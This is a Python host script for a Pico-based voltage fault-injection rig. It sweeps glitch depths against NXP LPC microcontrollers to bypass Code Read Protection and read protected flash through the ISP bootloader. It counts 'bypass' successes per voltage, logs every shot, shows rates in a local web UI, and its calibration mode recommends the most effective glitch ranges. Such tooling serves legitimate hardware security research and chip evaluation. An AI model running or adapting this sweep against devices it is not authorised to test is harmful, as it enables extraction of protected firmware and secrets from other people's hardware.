#!/usr/bin/env python3
"""
LPC CRP-bypass voltage glitch sweep.

For each target Vmin in a 1-D sweep range, fires N ADC-controlled power
glitches via the firmware's TARGET GLITCH LPCBYPASS command. The firmware
drops VDD until the ADC hits the requested threshold, restores power,
re-syncs the LPC bootloader, sends R 0 4, and classifies the response.

Per-shot result classification (parsed from the firmware's
"[LPC GLITCH] attempt=N vmin=X.XXV bor=Y/N dur=Nus isp=..." lines):
  normal    rc=19 (CRP held)
  bypass    rc=0 + flash content (CRP defeated, ISP read worked)
  effect    perturbed, no clean rc
  sync_fail couldn't re-enter ISP after the glitch

Output:
  CSV log (timestamp + per-shot data) + live text progress bar +
  optional web UI on http://localhost:8080 with a per-voltage bar
  showing bypass / normal / effect rates.

Usage:
  # Coarse sweep, 50 shots per voltage step
  python3 lpc_voltage_glitch_sweep.py --v-min 0.5 --v-max 2.5 --v-step 0.10 --shots 50

  # Fine sweep around a known sweet spot
  python3 lpc_voltage_glitch_sweep.py --v-min 1.65 --v-max 1.95 --v-step 0.02 --shots 100
"""
import serial
import time
import threading
import json
import csv
import re
import argparse
import queue
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# ---- CLI ----

parser = argparse.ArgumentParser(description='LPC CRP-bypass voltage sweep')
parser.add_argument('--port', default='/dev/ttyACM0',
                    help='Serial port of the Pico (default /dev/ttyACM0)')
parser.add_argument('--v-min', type=float, default=0.5,
                    help='Lowest Vmin to test, volts (default 0.5)')
parser.add_argument('--v-max', type=float, default=2.5,
                    help='Highest Vmin to test, volts (default 2.5)')
parser.add_argument('--v-step', type=float, default=0.10,
                    help='Step size, volts (default 0.10)')
parser.add_argument('--shots', type=int, default=20,
                    help='Attempts per voltage step (default 20)')
parser.add_argument('--target', default='LPC',
                    choices=['LPC', 'LPC2', 'LPC17'],
                    help='TARGET <type> to set before syncing')
parser.add_argument('--no-web', action='store_true',
                    help='Skip the web UI (text + CSV only)')
parser.add_argument('--calibrate', action='store_true',
                    help='Fast calibration: ONE shot per voltage descending until the chip stops responding. '
                         'Forces --shots 1 and aborts after --calibrate-fails consecutive sync_fail steps. '
                         'Output suggests a v-min / v-max range for the real sweep.')
parser.add_argument('--calibrate-fails', type=int, default=3,
                    help='Consecutive sync_fail steps that end a --calibrate run (default 3).')
args = parser.parse_args()

if args.calibrate:
    args.shots = 1   # one shot per voltage

# Build voltage sweep — descending so we move from "no glitch" toward
# "always BOR", which makes the curve easier to read.
def frange(start, stop, step):
    n = int(round((stop - start) / step)) + 1
    return [round(start + i * step, 4) for i in range(n)]

VOLTAGES = sorted(frange(args.v_min, args.v_max, args.v_step), reverse=True)
TOTAL_CELLS = len(VOLTAGES)
SHOTS = args.shots

# ---- shared state ----

CSV_FILE = f"lpcbypass_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
csv_lock = threading.Lock()

# voltage(float) -> dict(bypass, normal, effect, sync_fail, shots)
results = {}
current_voltage = None
update_queue = queue.Queue()
server_ready = threading.Event()
scan_start_time = None

SCAN_INFO = (f"V sweep [{args.v_min:.2f}..{args.v_max:.2f} step {args.v_step:.2f}] "
             f"= {TOTAL_CELLS} voltages, {SHOTS} shots/voltage. "
             f"Target: {args.target}.")

def init_csv():
    with open(CSV_FILE, 'w', newline='') as f:
        csv.writer(f).writerow([
            'timestamp', 'voltage', 'attempt',
            'vmin_v', 'bor', 'dur_us', 'isp_result',
        ])

def log_shot(voltage, attempt, vmin_v, bor, dur_us, isp_result):
    with csv_lock:
        with open(CSV_FILE, 'a', newline='') as f:
            csv.writer(f).writerow([
                datetime.now().isoformat(),
                voltage, attempt, vmin_v, bor, dur_us, isp_result,
            ])

# ---- Web UI ----

HTML_PAGE = '''<!DOCTYPE html>
<html><head><title>LPC Voltage Glitch Sweep</title>
<style>
body {background:#1a1a2e;color:#eee;font-family:monospace;padding:20px;}
h1 {color:#00ff88;}
#status {margin:10px 0;padding:10px;background:#16213e;border-radius:5px;}
.row {display:flex;align-items:center;margin:3px 0;font-size:13px;}
.vlabel {width:65px;color:#888;text-align:right;padding-right:10px;}
.bar {height:18px;display:flex;flex:1;border:1px solid #00ff88;
      background:#0f0f23;border-radius:2px;overflow:hidden;}
.bar-segment {height:100%;display:flex;align-items:center;
              justify-content:center;color:#000;font-size:10px;}
.bypass {background:#0088ff;}
.normal {background:#00ff00;}
.effect {background:#ffaa00;}
.syncfail {background:#aa4444;}
.counts {min-width:160px;padding-left:10px;font-size:11px;color:#888;}
#info {margin-top:20px;color:#888;}
.legend {margin:10px 0;font-size:12px;}
.legend span {display:inline-block;padding:2px 8px;margin-right:8px;color:#000;}
</style></head>
<body>
<h1>LPC CRP-bypass Voltage Sweep</h1>
<div id="status">Connecting...</div>
<div class="legend">
  <span class="bypass">BYPASS</span>
  <span class="normal">normal (rc=19)</span>
  <span class="effect">effect</span>
  <span class="syncfail">sync_fail</span>
</div>
<div id="rows"></div>
<div id="info">{{SCAN_INFO}}</div>
<script>
const VOLTAGES = {{VOLTAGES_JSON}};
const SHOTS = {{SHOTS}};
const status = document.getElementById('status');
const rowsDiv = document.getElementById('rows');
const rowMap = {};

function buildRows() {
    rowsDiv.innerHTML = '';
    VOLTAGES.forEach(v => {
        const row = document.createElement('div');
        row.className = 'row';
        row.innerHTML =
            '<div class="vlabel">' + v.toFixed(2) + 'V</div>' +
            '<div class="bar" id="bar_' + v + '">' +
            '<div class="bar-segment bypass" style="width:0%"></div>' +
            '<div class="bar-segment normal" style="width:0%"></div>' +
            '<div class="bar-segment effect" style="width:0%"></div>' +
            '<div class="bar-segment syncfail" style="width:0%"></div>' +
            '</div>' +
            '<div class="counts" id="counts_' + v + '">0 shots</div>';
        rowsDiv.appendChild(row);
        rowMap[v] = row;
    });
}
buildRows();

function updateRow(v, info) {
    const bar = document.getElementById('bar_' + v);
    const counts = document.getElementById('counts_' + v);
    if (!bar) return;
    const total = info.shots || 1;
    const segs = bar.querySelectorAll('.bar-segment');
    const widths = [
        info.bypass    / total * 100,
        info.normal    / total * 100,
        info.effect    / total * 100,
        info.sync_fail / total * 100,
    ];
    const labels = [info.bypass, info.normal, info.effect, info.sync_fail];
    for (let i = 0; i < 4; i++) {
        segs[i].style.width = widths[i] + '%';
        segs[i].textContent = labels[i] > 0 ? labels[i] : '';
    }
    counts.textContent =
        info.shots + '/' + SHOTS + ' shots, ' +
        info.bypass + ' bypass, ' + info.effect + ' eff';
}

function highlightCurrent(v) {
    Object.entries(rowMap).forEach(([key, row]) => {
        row.style.background = parseFloat(key) === parseFloat(v) ? '#222244' : '';
    });
}

const evt = new EventSource('/events');
evt.onopen = () => status.textContent = 'Connected - waiting for first shot...';
evt.onmessage = (e) => {
    const d = JSON.parse(e.data);
    if (d.type === 'init') {
        Object.entries(d.results).forEach(([v, info]) => updateRow(v, info));
        status.textContent = 'Tested ' + Object.keys(d.results).length + ' / ' + VOLTAGES.length + ' voltages';
    } else if (d.type === 'voltage_start') {
        highlightCurrent(d.voltage);
        status.textContent = 'Sweeping ' + d.voltage.toFixed(2) + 'V (' + d.count + '/' + VOLTAGES.length + ')';
    } else if (d.type === 'shot') {
        updateRow(d.voltage, d.info);
    } else if (d.type === 'complete') {
        status.textContent = 'Complete. ' + d.total_bypass + ' total bypasses across ' +
                             VOLTAGES.length + ' voltages. Log: ' + d.csv;
        status.style.color = '#00ff88';
    }
};
evt.onerror = () => {
    status.textContent = 'Connection lost - refresh to reconnect';
    status.style.color = '#ff4444';
};
</script></body></html>'''


class RequestHandler(BaseHTTPRequestHandler):
    def log_message(self, *a, **kw): pass

    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            html = (HTML_PAGE
                    .replace('{{SCAN_INFO}}', SCAN_INFO)
                    .replace('{{VOLTAGES_JSON}}', json.dumps(VOLTAGES))
                    .replace('{{SHOTS}}', str(SHOTS)))
            self.wfile.write(html.encode())
        elif self.path == '/events':
            self.send_response(200)
            self.send_header('Content-Type', 'text/event-stream')
            self.send_header('Cache-Control', 'no-cache')
            self.end_headers()
            init = {'type': 'init', 'results': {str(k): v for k, v in results.items()}}
            self.wfile.write(f"data: {json.dumps(init)}\n\n".encode())
            self.wfile.flush()
            while True:
                try:
                    u = update_queue.get(timeout=15)
                    self.wfile.write(f"data: {json.dumps(u)}\n\n".encode())
                    self.wfile.flush()
                except queue.Empty:
                    self.wfile.write(": keepalive\n\n".encode())
                    self.wfile.flush()
                except (BrokenPipeError, ConnectionResetError):
                    return


def run_server():
    HTTPServer(('0.0.0.0', 8080), RequestHandler).serve_forever()


def broadcast(payload):
    update_queue.put(payload)


# ---- Pico talk ----

s = None

def send_cmd(cmd, timeout=5):
    s.write((cmd + '\r\n').encode()); time.sleep(0.05)
    response, t0 = '', time.time()
    while time.time() - t0 < timeout:
        if s.in_waiting:
            response += s.read(s.in_waiting).decode('utf-8', 'ignore')
            if 'OK:' in response or 'ERROR:' in response or '> ' in response:
                break
        time.sleep(0.05)
    return response


# Parse "[LPC GLITCH] attempt=N vmin=X.XXV bor=Y dur=Nus isp=..."
_LPC_GLITCH_RE = re.compile(
    r'\[LPC GLITCH\]\s+attempt=(\d+)\s+vmin=([0-9.]+)V\s+bor=(\w)\s+dur=(\d+)us\s+isp=(\w+)'
)


def run_voltage(voltage):
    """Push VMIN to firmware then send TARGET GLITCH LPCBYPASS <SHOTS>, parse
    per-shot lines, return counters. Also logs to CSV and broadcasts to UI."""
    info = {'bypass': 0, 'normal': 0, 'effect': 0, 'sync_fail': 0, 'shots': 0}
    results[voltage] = info

    print(f"\n--- {voltage:.2f}V ---", flush=True)
    # Firmware reads depth from glitch config VMIN (mV) and dwell from WIDTH
    # (host should SET WIDTH separately if a non-default dwell is wanted).
    vmin_mv = int(round(voltage * 1000))
    s.write(f"SET VMIN {vmin_mv}\r\n".encode())
    # Drain the SET VMIN OK echo before firing so we don't confuse the parser.
    drain_deadline = time.time() + 0.4
    while time.time() < drain_deadline:
        if s.in_waiting:
            s.read(s.in_waiting)
            drain_deadline = time.time() + 0.1
        else:
            time.sleep(0.02)

    cmd = f"TARGET GLITCH LPCBYPASS {SHOTS}"
    s.write((cmd + '\r\n').encode())

    # Stream the firmware output, parsing one [LPC GLITCH] line per shot.
    # Firmware prints "LPC CRP-bypass voltage glitch:" once after its guardrail
    # checks pass and before the shot loop. After that line, the loop is live —
    # any "ERROR:" line we see (e.g. transient ISP "Timeout waiting for
    # 'Synchronized'") is recoverable and will be followed by the per-shot
    # "[LPC GLITCH] ... isp=sync_fail" classifier. Only treat ERROR as fatal
    # if it appears BEFORE the loop banner (a real guardrail rejection like
    # VMIN-disabled, idle-too-low, or target-not-below-idle).
    line_buf = ''
    last_data = time.time()
    deadline = time.time() + max(60, SHOTS * 10)
    done = False
    firmware_error = None
    loop_started = False
    while time.time() < deadline and not done:
        if s.in_waiting:
            line_buf += s.read(s.in_waiting).decode('utf-8', 'replace')
            last_data = time.time()
            lines = line_buf.split('\n')
            line_buf = lines[-1]
            for ln in lines[:-1]:
                ln = ln.rstrip('\r')
                m = _LPC_GLITCH_RE.search(ln)
                if m:
                    loop_started = True
                    attempt = int(m.group(1))
                    vmin = float(m.group(2))
                    bor = m.group(3)
                    dur = int(m.group(4))
                    isp = m.group(5)
                    info[isp] = info.get(isp, 0) + 1
                    info['shots'] = attempt
                    log_shot(voltage, attempt, vmin, bor, dur, isp)
                    broadcast({'type': 'shot', 'voltage': voltage, 'info': dict(info)})
                    sym = {'bypass': '+', 'normal': '.', 'effect': '!', 'sync_fail': 'S'}.get(isp, '?')
                    print(sym, end='', flush=True)
                elif 'LPC CRP-bypass voltage glitch:' in ln:
                    loop_started = True
                elif ln.startswith('ERROR:'):
                    if loop_started:
                        # Transient per-shot ISP error — the trailing
                        # "[LPC GLITCH] ... isp=sync_fail" classifier is what
                        # actually counts. Ignore.
                        continue
                    # Pre-loop firmware rejection (guardrail). Propagate.
                    firmware_error = ln
                    done = True
                    break
                elif 'Idle target VDD:' in ln:
                    print(f"\n  {ln.strip()}", flush=True)
                elif 'summary' in ln.lower() and voltage in results:
                    done = True
                    break
            if info['shots'] >= SHOTS:
                drain_end = time.time() + 0.5
                while time.time() < drain_end:
                    extra = s.read(s.in_waiting or 1)
                    if not extra:
                        break
                done = True
        elif time.time() - last_data > 8:
            print(' [stalled]', end='', flush=True)
            break
        else:
            time.sleep(0.05)

    if firmware_error:
        print(f"\n  FIRMWARE REJECTED: {firmware_error.strip()}", flush=True)
        info['firmware_error'] = firmware_error.strip()

    print(f"  → {info['bypass']} bypass, {info['normal']} normal, "
          f"{info['effect']} effect, {info['sync_fail']} sync_fail",
          flush=True)
    return info


def main():
    global s, scan_start_time

    init_csv()
    print(f"CSV log: {CSV_FILE}", flush=True)
    print(SCAN_INFO, flush=True)

    if not args.no_web:
        threading.Thread(target=run_server, daemon=True).start()
        time.sleep(0.5)
        print("Web UI: http://localhost:8080", flush=True)

    s = serial.Serial(args.port, 115200, timeout=0.3)
    s.reset_input_buffer()
    time.sleep(0.3)

    # Make sure the target is set up. We don't do an initial TARGET SYNC
    # here because LPCBYPASS handles its own per-attempt re-sync.
    print("\n=== Target setup ===", flush=True)
    send_cmd('TARGET POWER CYCLE', timeout=5)
    send_cmd(f"TARGET {args.target}")

    print("\n=== Starting voltage sweep ===", flush=True)
    scan_start_time = time.time()
    total_bypass = 0

    aborted = False
    consecutive_sync_fail = 0
    last_alive_v = None
    first_dead_v = None
    for i, v in enumerate(VOLTAGES, start=1):
        broadcast({'type': 'voltage_start', 'voltage': v, 'count': i})
        info = run_voltage(v)
        total_bypass += info['bypass']

        # Abort if the firmware refused the request — likely a config issue
        # (idle voltage unreadable, target voltage too close to idle, etc.)
        if info.get('firmware_error'):
            err = info['firmware_error']
            if 'idle' in err.lower() and 'too low' in err.lower():
                print("\nABORT: firmware can't see a valid idle voltage on GP26.", flush=True)
                aborted = True
                break
            if 'safe floor' in err.lower():
                print("\nABORT: hit safe floor; lower voltages will also be refused.", flush=True)
                aborted = True
                break
            continue  # other errors are per-step; keep going

        # Calibration mode: stop once the chip can't survive any more.
        if args.calibrate:
            if info['sync_fail'] == info['shots'] and info['shots'] > 0:
                consecutive_sync_fail += 1
                if first_dead_v is None:
                    first_dead_v = v
                if consecutive_sync_fail >= args.calibrate_fails:
                    print(f"\n  {consecutive_sync_fail} consecutive sync_fail — chip can't survive below this.",
                          flush=True)
                    aborted = True
                    break
            else:
                # Chip recovered this shot
                consecutive_sync_fail = 0
                first_dead_v = None
                last_alive_v = v

    elapsed = time.time() - scan_start_time
    print(f"\n=== Sweep complete in {elapsed/60:.1f} min ===", flush=True)

    if args.calibrate:
        # Calibration-specific summary
        print(f"\n=== Calibration result ===", flush=True)
        if last_alive_v is None:
            print("  Chip never survived a glitch in the sweep range.", flush=True)
            print(f"  Try raising --v-max (closer to idle).", flush=True)
        elif first_dead_v is None and not aborted:
            print(f"  Chip survived every voltage from {args.v_max:.2f}V to {args.v_min:.2f}V.", flush=True)
            print(f"  Try lowering --v-min for more depth.", flush=True)
        else:
            floor = first_dead_v if first_dead_v else args.v_min
            recommended_min = round(floor + args.v_step, 4)  # just above the floor
            recommended_max = round(min(last_alive_v + args.v_step * 3, args.v_max), 4)
            print(f"  Lowest voltage where ISP survived: {last_alive_v:.2f}V", flush=True)
            print(f"  First voltage where ISP died:      {floor:.2f}V", flush=True)
            print(f"\n  Suggested real-sweep range:", flush=True)
            print(f"    --v-min {recommended_min:.2f} --v-max {recommended_max:.2f} "
                  f"--v-step {args.v_step / 2:.3f} --shots 50", flush=True)
        return

    print(f"  Total bypasses: {total_bypass}", flush=True)
    print(f"  Best voltage(s):", flush=True)
    ranked = sorted(results.items(),
                    key=lambda kv: (-kv[1]['bypass'], -kv[1]['effect']))
    for v, info in ranked[:5]:
        if info['bypass'] > 0:
            print(f"    {v:.2f}V — {info['bypass']}/{info['shots']} bypass "
                  f"({100 * info['bypass'] / max(info['shots'], 1):.1f}%)",
                  flush=True)

    broadcast({'type': 'complete', 'total_bypass': total_bypass, 'csv': CSV_FILE})

    s.close()
    if not args.no_web:
        print("\nWeb UI kept alive. Ctrl+C to exit.", flush=True)
        try:
            while True:
                time.sleep(60)
        except KeyboardInterrupt:
            pass


if __name__ == '__main__':
    main()
